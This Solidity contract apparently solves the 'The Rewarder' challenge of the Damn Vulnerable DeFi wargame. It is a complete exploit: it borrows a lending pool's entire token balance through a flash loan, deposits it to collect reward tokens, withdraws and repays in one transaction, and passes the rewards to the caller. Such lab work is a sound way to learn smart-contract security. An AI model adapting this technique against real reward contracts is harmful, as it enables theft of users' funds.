// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";


contract TheRewarderExploit {
    FlashLoanerPool public immutable flpool;
    DamnValuableToken public immutable dvtoken;
    TheRewarderPool public immutable rpool;
    RewardToken public immutable rtoken;


    constructor(address _flashLoanerPool, address _damnValuableToken, address _rewarderPool, address _rewardToken) {
        flpool = FlashLoanerPool(_flashLoanerPool);
        dvtoken = DamnValuableToken(_damnValuableToken);
        rpool = TheRewarderPool(_rewarderPool);
        rtoken = RewardToken(_rewardToken);
    }
    function exploit() external {
        flpool.flashLoan(dvtoken.balanceOf(address(flpool)));
        rtoken.transfer(msg.sender, rtoken.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) external {
        dvtoken.approve(address(rpool), amount);
        rpool.deposit(amount);
        rpool.withdraw(amount);
        dvtoken.transfer(address(flpool), amount);
    }
}